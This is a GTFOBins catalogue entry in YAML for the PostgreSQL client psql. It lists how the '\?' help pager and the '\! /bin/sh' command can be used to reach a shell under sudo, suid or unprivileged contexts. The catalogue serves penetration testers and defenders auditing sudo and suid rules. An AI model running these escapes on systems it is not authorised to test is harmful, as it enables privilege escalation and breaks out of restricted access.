<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/psql -->
---
comment: |-
  A valid PostgreSQL server must be available to connect to.
functions:
  inherit:
  - code: |-
      psql
      \?
    contexts:
      sudo:
      suid:
      unprivileged:
    from: less
  shell:
  - code: |-
      psql
      \! /bin/sh
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
